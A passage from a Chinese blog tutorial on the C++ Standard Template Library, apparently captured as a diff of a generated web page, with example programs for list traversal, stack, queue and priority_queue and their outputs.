+<h3 id="2-2-3-遍历方式"><a href="#2-2-3-遍历方式" class="headerlink" title="2.2.3 遍历方式"></a>2.2.3 遍历方式</h3><p>双向链表list支持使用迭代器正向的遍历，也支持迭代器逆向的遍历，但是不能使用 [] 索引的方式进行遍历。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;list&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    list&lt;int&gt; l1;</span><br><span class="line">	</span><br><span class="line">    // 插入元素方式演示</span><br><span class="line">    l1.push_front(1);            // 头部插入</span><br><span class="line">    l1.push_back(2);             // 尾部插入</span><br><span class="line">    l1.insert(l1.begin(), 3);    // 开始位置插入</span><br><span class="line">    l1.insert(l1.end(), 4);        // 结束位置插入</span><br><span class="line">	</span><br><span class="line">    cout &lt;&lt; &quot;list链表是否为空：&quot; &lt;&lt; l1.empty() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;list链表中元素个数：&quot; &lt;&lt; l1.size() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;list链表第一个元素：&quot; &lt;&lt; l1.front() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;list链表最后一个元素：&quot; &lt;&lt; l1.back() &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">    // 遍历链表正向</span><br><span class="line">    list&lt;int&gt;::iterator itor = l1.begin();</span><br><span class="line">    for (; itor != l1.end(); itor++)</span><br><span class="line">        cout &lt;&lt; *itor &lt;&lt; &quot; &quot;;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">    // 遍历链表逆向</span><br><span class="line">    list&lt;int&gt;::reverse_iterator reitor = l1.rbegin();</span><br><span class="line">    for (; reitor != l1.rend(); reitor++)</span><br><span class="line">        cout &lt;&lt; *reitor &lt;&lt; &quot; &quot;;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">    // 将链表排序</span><br><span class="line">    l1.sort();</span><br><span class="line">    itor = l1.begin();</span><br><span class="line">    cout &lt;&lt; &quot;重新排序之后正向遍历：&quot;;</span><br><span class="line">    for (; itor != l1.end(); itor++)</span><br><span class="line">        cout &lt;&lt; *itor &lt;&lt; &quot; &quot;;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">    // 清除容器中的所有元素</span><br><span class="line">    l1.clear();</span><br><span class="line">    cout &lt;&lt; &quot;清除容器所有元素之后大小：&quot; &lt;&lt; l1.size() &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果为：</p>
+<p><img src="https://img-blog.csdnimg.cn/20191015203210384.png"></p>
+<h2 id="2-3-stack"><a href="#2-3-stack" class="headerlink" title="2.3 stack"></a>2.3 stack</h2><p>std::stack 类是容器适配器，它给予程序员栈的功能——特别是 FILO （先进后出）数据结构。</p>
+<h3 id="2-3-1-stack常用函数"><a href="#2-3-1-stack常用函数" class="headerlink" title="2.3.1 stack常用函数"></a>2.3.1 stack常用函数</h3><blockquote>
+<p>empty()：检查底层的容器是否为空<br>top()：访问栈顶元素<br>size()：返回容纳的元素数<br>push()：向栈顶插入元素<br>pop()：删除栈顶元素<br>swap()：交换内容</p>
+</blockquote>
+<h3 id="2-3-2-常用函数的使用"><a href="#2-3-2-常用函数的使用" class="headerlink" title="2.3.2 常用函数的使用"></a>2.3.2 常用函数的使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stack&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	//创建栈 s</span><br><span class="line">	stack&lt;int&gt; s;</span><br><span class="line">	</span><br><span class="line">	//将元素压入栈</span><br><span class="line">	for(i = 0; i &lt; 10; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s.push(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; &quot;栈s中元素的个数为：&quot; &lt;&lt; s.size() &lt;&lt; endl;</span><br><span class="line">	while(!s.empty())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; s.top() &lt;&lt; &quot; &quot;;								//获取栈顶元素</span><br><span class="line">		s.pop();											//弹出栈顶元素</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	if(s.empty())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; &quot;栈s现在为空&quot; &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出结果为：</p>
+<p><img src="https://img-blog.csdnimg.cn/20191015205117226.png"></p>
+<h2 id="2-4-queue容器"><a href="#2-4-queue容器" class="headerlink" title="2.4 queue容器"></a>2.4 queue容器</h2><p>C++队列queue模板类的定义在<queue>头文件中,queue模板类需要两个模板参数，一个是元素类型，一个容器类型，元素类型是必要的，容器类型是可选的，默认为deque类型。<br>C++队列Queue是一种容器适配器，它给予程序员一种先进先出(FIFO)的数据结构。</p>
+<h3 id="2-4-1-初始化list对象的方式："><a href="#2-4-1-初始化list对象的方式：" class="headerlink" title="2.4.1 初始化list对象的方式："></a>2.4.1 初始化list对象的方式：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;int&gt; q1;</span><br><span class="line">queue&lt;double&gt; q2;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-2-queue常用函数"><a href="#2-4-2-queue常用函数" class="headerlink" title="2.4.2 queue常用函数"></a>2.4.2 queue常用函数</h3><blockquote>
+<p>top：访问队头元素<br>empty()：如果queue中没有元素的话，返回true。<br>size()：返回queue中元素的个数。<br>front()：返回queue中第一个元素的引用，若queue是常量，返回一个常引用，若queue为空，返回值是未定义的。<br>back()：返回queue中最后一个元素的引用，若queue是常量，返回一个常引用，若queue为空，返回值是未定义的。<br>push()：在queue的尾部添加一个元素的副本。这是通过调用底层容器的成员函数push_back()来完成的。<br>pop()：删除queue中的第一个元素。<br>swap(queue<T> &amp;other_q)：将当前queue中的元素和参数queue中<br>的元素交换。它们需要包含相同类型的元素。也可以调用全局函数模板 swap(q1, q2) 来将当前q1中的元素和q1中的元素中的元素交换</p>
+</blockquote>
+<h3 id="2-4-3-队列使用"><a href="#2-4-3-队列使用" class="headerlink" title="2.4.3 队列使用"></a>2.4.3 队列使用</h3><p>对queue进行遍历，可以将其赋予一个副本，然后将副本边输出，边弹出元素。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;queue&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int e, n, m, i;</span><br><span class="line">    queue&lt;int&gt; q1, q2;</span><br><span class="line">	queue&lt;int&gt; q3, q4;</span><br><span class="line"></span><br><span class="line">    for(i = 0; i &lt; 10; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		q1.push(i);</span><br><span class="line">		q3.push(i);</span><br><span class="line">		q2.push(i + 10);</span><br><span class="line">		q4.push(i + 10);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; &quot;队列q1\n&quot;;</span><br><span class="line">    if(!q1.empty())</span><br><span class="line">		cout &lt;&lt; &quot;dui lie  bu kong\n&quot;;</span><br><span class="line">    n = q1.size();</span><br><span class="line">    cout &lt;&lt; n &lt;&lt; endl;</span><br><span class="line">    m = q1.back();</span><br><span class="line">    cout &lt;&lt; m &lt;&lt; endl;</span><br><span class="line">    for(i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">		e = q1.front();</span><br><span class="line">		cout &lt;&lt; e &lt;&lt; &quot; &quot;;</span><br><span class="line">		q1.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    if(q1.empty())</span><br><span class="line">		cout &lt;&lt; &quot;dui lie  bu kong\n&quot;;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; &quot;队列q2\n&quot;;</span><br><span class="line">	if(!q2.empty())</span><br><span class="line">		cout &lt;&lt; &quot;dui lie  bu kong\n&quot;;</span><br><span class="line">    n = q2.size();</span><br><span class="line">    cout &lt;&lt; n &lt;&lt; endl;</span><br><span class="line">    m = q2.back();</span><br><span class="line">    cout &lt;&lt; m &lt;&lt; endl;</span><br><span class="line">    for(i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">		e = q2.front();</span><br><span class="line">		cout &lt;&lt; e &lt;&lt; &quot; &quot;;</span><br><span class="line">		q2.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    if(q2.empty())</span><br><span class="line">		cout &lt;&lt; &quot;dui lie  bu kong\n&quot;;</span><br><span class="line"></span><br><span class="line">	swap(q3, q4);</span><br><span class="line">	cout &lt;&lt; &quot;队列q1与队列q2交换后\n&quot;;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; &quot;队列q1\n&quot;;</span><br><span class="line">	for(i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">		e = q3.front();</span><br><span class="line">		cout &lt;&lt; e &lt;&lt; &quot; &quot;;</span><br><span class="line">		q3.pop();</span><br><span class="line">    &#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; &quot;队列q2\n&quot;;</span><br><span class="line">	for(i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">		e = q4.front();</span><br><span class="line">		cout &lt;&lt; e &lt;&lt; &quot; &quot;;</span><br><span class="line">		q4.pop();</span><br><span class="line">    &#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果为：</p>
+<p><img src="https://img-blog.csdnimg.cn/20191015215709119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h3 id="2-4-4-优先队列使用"><a href="#2-4-4-优先队列使用" class="headerlink" title="2.4.4 优先队列使用"></a>2.4.4 优先队列使用</h3><blockquote>
+<p>priority_queue&lt;Type, Container, Functional&gt;</p>
+</blockquote>
+<p>Type为数据类型， Container为保存数据的容器，Functional为元素比较方式。<br>如果不写后两个参数，那么容器默认用的是vector，比较方式默认用operator&lt;，也就是优先队列是大顶堆，队头元素最大。</p>
+<h4 id="2-4-4-1-优先输出大数据"><a href="#2-4-4-1-优先输出大数据" class="headerlink" title="2.4.4.1 优先输出大数据"></a>2.4.4.1 优先输出大数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;queue&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    priority_queue&lt;int&gt; p;</span><br><span class="line">    p.push(1);</span><br><span class="line">    p.push(2);</span><br><span class="line">    p.push(8);</span><br><span class="line">    p.push(5);</span><br><span class="line">    p.push(43);</span><br><span class="line">    for(int i = 0; i &lt; 5; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; p.top() &lt;&lt; endl;</span><br><span class="line">        p.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果为：</p>
+<blockquote>
+<p>43<br>8<br>5<br>2<br>1</p>
+</blockquote>
+<h4 id="2-4-4-2-优先输出小数据"><a href="#2-4-4-2-优先输出小数据" class="headerlink" title="2.4.4.2 优先输出小数据"></a>2.4.4.2 优先输出小数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;queue&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt;p;</span><br><span class="line">    p.push(1);</span><br><span class="line">    p.push(2);</span><br><span class="line">    p.push(8);</span><br><span class="line">    p.push(5);</span><br><span class="line">    p.push(43);</span><br><span class="line">    for(int i = 0; i &lt; 5; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; p.top() &lt;&lt; endl;</span><br><span class="line">        p.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果为：</p>
+<blockquote>
+<p>1<br>2<br>5<br>8<br>43</p>
+</blockquote>
+<h4 id="2-4-4-3-自定义优先级，重载默认的-lt-符号"><a href="#2-4-4-3-自定义优先级，重载默认的-lt-符号" class="headerlink" title="2.4.4.3 自定义优先级，重载默认的  &lt; 符号"></a>2.4.4.3 自定义优先级，重载默认的  &lt; 符号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;queue&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">struct Node</span><br><span class="line">&#123;</span><br><span class="line">    int x, y;</span><br><span class="line">    Node(int a = 0, int b = 0) : x(a), y(b) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">struct cmp</span><br><span class="line">&#123;</span><br><span class="line">    bool operator() (Node a, Node b)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a.x == b.x)</span><br><span class="line">            return a.y &gt; b.y;</span><br><span class="line">        return a.x &gt; b.x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    priority_queue&lt;Node, vector&lt;Node&gt;, cmp&gt; p;</span><br><span class="line">    for(int i = 0; i &lt; 10; ++i)</span><br><span class="line">        p.push(Node(rand(), rand()));   </span><br><span class="line">    while(!p.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; p.top().x &lt;&lt; &#x27; &#x27; &lt;&lt; p.top().y &lt;&lt; endl;</span><br><span class="line">        p.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果为：</p>
+<blockquote>
+<p>491 9961<br>5436 4827<br>11942 2995<br>15724 19169<br>16827 23281<br>18467 41<br>24464 26962<br>26500 6334<br>28145 5705<br>29358 11478</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/15/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93%EF%BC%88Standard%20Template%20Library,STL%EF%BC%89/" data-id="cl1qb1dxa000yqktuboqsfo2v" data-title="C++标准模板库（Standard Template Library,STL）" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" rel="tag">库与模块</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/5/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/7/">下一页 &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSharp/">CSharp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Cpp/">Cpp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/DVWA/">DVWA</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/JavaScript/">JavaScript</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/">MySQL</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C/">经验</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/">计算机考研复试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/APP-Inventor/" rel="tag">APP Inventor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSharp/" rel="tag">CSharp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/" rel="tag">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6/" rel="tag">信息安全数学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag">协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" rel="tag">库与模块</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" rel="tag">拒绝服务攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%99%E6%9D%90%E7%AD%94%E6%A1%88/" rel="tag">教材答案</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" rel="tag">牛客网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%8F%E9%AA%8C/" rel="tag">经验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/" rel="tag">计算机考研复试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/APP-Inventor/" style="font-size: 10.83px;">APP Inventor</a> <a href="/tags/Android/" style="font-size: 13.33px;">Android</a> <a href="/tags/C/" style="font-size: 16.67px;">C</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/CSharp/" style="font-size: 10px;">CSharp</a> <a href="/tags/CTF/" style="font-size: 19.17px;">CTF</a> <a href="/tags/DVWA/" style="font-size: 12.5px;">DVWA</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/JavaScript/" style="font-size: 14.17px;">JavaScript</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Misc/" style="font-size: 10px;">Misc</a> <a href="/tags/MySQL/" style="font-size: 10.83px;">MySQL</a> <a href="/tags/Reverse/" style="font-size: 11.67px;">Reverse</a> <a href="/tags/Web/" style="font-size: 17.5px;">Web</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/writeup/" style="font-size: 18.33px;">writeup</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6/" style="font-size: 10.83px;">信息安全数学</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 14.17px;">前端</a> <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" style="font-size: 10px;">区块链</a> <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size: 10.83px;">协议</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15.83px;">密码学</a> <a href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" style="font-size: 13.33px;">库与模块</a> <a href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" style="font-size: 10.83px;">拒绝服务攻击</a> <a href="/tags/%E6%95%99%E6%9D%90%E7%AD%94%E6%A1%88/" style="font-size: 10px;">教材答案</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 15px;">数据结构</a> <a href="/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" style="font-size: 